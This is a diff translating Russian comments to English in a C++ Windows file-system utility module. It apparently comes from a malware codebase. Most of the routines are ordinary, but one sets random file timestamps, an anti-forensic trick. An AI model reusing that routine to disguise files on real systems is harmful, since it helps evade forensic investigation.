@@ -86,7 +86,7 @@ bool Fs::_fileToMem(LPWSTR fileName, MEMFILE *mem, DWORD flags)
         DWORD readed;
         if(CWA(kernel32, ReadFile)(mem->file, mem->data, mem->size, &readed, NULL) != FALSE && readed == mem->size)
         {
-          //FIXME: Менять протекцию на ReadOnly?
+          //FIXME: Change the patronage to ReadOnly?
           return true;
         }
         CWA(kernel32, VirtualFree)(mem->data, 0, MEM_RELEASE);
@@ -314,14 +314,14 @@ bool Fs::_setRandomFileTime(DWORD startTime, DWORD reservedSeconds, LPWSTR fileN
 {
   register DWORD currentTime = Time::_getTime();
 
-  //Проверяем ошибки времени.
+  //Check run-time errors.
   if(currentTime <= reservedSeconds || currentTime < startTime || (currentTime -= reservedSeconds) < startTime)return false;
 
-  //Генерируем время.
+  //Generate a time.
   currentTime = startTime + Crypt::mtRandRange(0, currentTime - startTime);
-  if(currentTime < startTime)return false; /*параноя*/
+  if(currentTime < startTime)return false; /*paranoia*/
 
-  //Выставляем время.
+  //Set the time.
   {
     bool ok = true;
     WCHAR path[MAX_PATH];
@@ -364,7 +364,7 @@ bool Fs::_createDirectoryTree(LPWSTR path, LPSECURITY_ATTRIBUTES securityAttribu
   bool r = false;
   LPWSTR p = CWA(shlwapi, PathSkipRootW)(path);
 
-  //Непонятно, может ли оно вернуть NULL. Помня фокус индусов с wsprintf, защитимся от этого.
+  //It is unclear whether it can return NULL. Remembering focus Indians with wsprintf, protect themselves against it.
   if(p == NULL)p = path; 
 
   for(;; p++)if(*p == '\\' || *p == '/' || *p == 0)
@@ -374,15 +374,15 @@ bool Fs::_createDirectoryTree(LPWSTR path, LPSECURITY_ATTRIBUTES securityAttribu
 
     DWORD attr = CWA(kernel32, GetFileAttributesW)(path);
     
-    //Не существует.
+    //Does not exist.
     if(attr == INVALID_FILE_ATTRIBUTES)
     {
       if(CWA(kernel32, CreateDirectoryW)(path, securityAttributes) == FALSE)break;
     }
-    //Это не директория.
+    //This is not a directory.
     else if((attr & FILE_ATTRIBUTE_DIRECTORY) == 0)break;
 
-    //Если добрались до конца, то успешный выход.
+    //If it got to the end, successful exit.
     if(cold == 0){r = true; break;}
 
     *p = cold;
@@ -400,9 +400,9 @@ bool Fs::_removeDirectoryTree(LPWSTR path)
   {
     do if(!_isDotsName(wfd.cFileName) && _pathCombine(curPath, path, wfd.cFileName))
     {
-      //Подпапка.
+      //Subfolder.
       if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)_removeDirectoryTree(curPath);
-      //Файл
+      //File
       else _removeFile(curPath);
     }
     while(CWA(kernel32, FindNextFileW)(handle, &wfd) != FALSE);
@@ -427,7 +427,7 @@ void Fs::_findFiles(LPWSTR path, const LPWSTR *fileMasks, DWORD fileMasksCount, 
       
       if(!_isDotsName(wfd.cFileName))
       {
-        //Сравнение.
+        //Comparison.
         if((wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && flags & FFFLAG_SEARCH_FOLDERS) ||
           (!(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && flags & FFFLAG_SEARCH_FILES))
         {
@@ -439,7 +439,7 @@ void Fs::_findFiles(LPWSTR path, const LPWSTR *fileMasks, DWORD fileMasksCount, 
           }
         }
       
-        //Вход в подпапку.
+        //Log into the subfolder.
         if(wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && flags & FFFLAG_RECURSIVE)
         {
           if(_pathCombine(curPath, path, wfd.cFileName))
